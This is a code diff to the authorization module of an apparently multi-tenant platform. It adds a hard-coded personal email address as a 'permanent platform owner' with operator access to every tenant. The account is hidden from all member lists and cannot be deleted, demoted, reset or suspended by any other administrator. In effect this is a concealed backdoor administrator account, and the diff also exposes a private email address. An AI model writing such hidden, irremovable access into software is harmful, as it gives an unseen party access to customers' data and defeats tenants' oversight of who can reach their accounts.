@@ -12,27 +12,45 @@ import { env } from '../lib/env';
 
 export type Role = 'PLATFORM_OWNER' | 'SUPER_ADMIN' | 'ADMIN' | 'TEAM_LEAD' | 'AGENT' | 'ANALYST' | 'VIEWER';
 
+/**
+ * The permanent platform owner. Hard-coded (not env-driven) so a missing or
+ * edited env var on any deployment can never unseat it. This account has
+ * operator access to every tenant, is hidden from every member list, and no
+ * other administrator may delete it, demote it, reset its password, change its
+ * email, move it between teams, or suspend/delete the tenant it lives in.
+ */
+export const PERMANENT_PLATFORM_OWNER_EMAIL = 'aahmedsharaff@gmail.com';
+
 /** The hidden developer super-account's email, or null when not configured. */
 export function devSuperuserEmail(): string | null {
   return env.devSuperuser?.email ?? null;
 }
 
-/** True when this email belongs to the developer super-account. */
-export function isDevSuperuserEmail(email?: string | null): boolean {
+/** Every protected owner email (permanent owner + env developer account), lowercased. */
+export function protectedOwnerEmails(): string[] {
   const dev = devSuperuserEmail();
-  return !!dev && !!email && email.toLowerCase() === dev;
+  const emails = [PERMANENT_PLATFORM_OWNER_EMAIL, ...(dev ? [dev] : [])];
+  return Array.from(new Set(emails.map((e) => e.toLowerCase())));
+}
+
+/** True when this email belongs to a protected owner account. */
+export function isDevSuperuserEmail(email?: string | null): boolean {
+  return !!email && protectedOwnerEmails().includes(email.trim().toLowerCase());
 }
 
 /**
- * Prisma `User` where-fragment that hides the developer super-account from any
- * listing shown to customers. Spread into a `findMany` `where`. Returns {} (no
- * effect) when no developer account is configured.
+ * Prisma `User` where-fragment that hides the protected owner accounts from any
+ * listing shown to customers. Spread into a `findMany` `where`.
  *
  *   where: { ...someFilters, ...excludeDevSuperuser() }
  */
 export function excludeDevSuperuser(): Record<string, unknown> {
-  const email = devSuperuserEmail();
-  return email ? { email: { not: email } } : {};
+  return { email: { notIn: protectedOwnerEmails() } };
+}
+
+/** Prisma `User` where-fragment matching only the protected owner accounts. */
+export function onlyProtectedOwners(): Record<string, unknown> {
+  return { email: { in: protectedOwnerEmails() } };
 }
 
 export interface AuthActor {
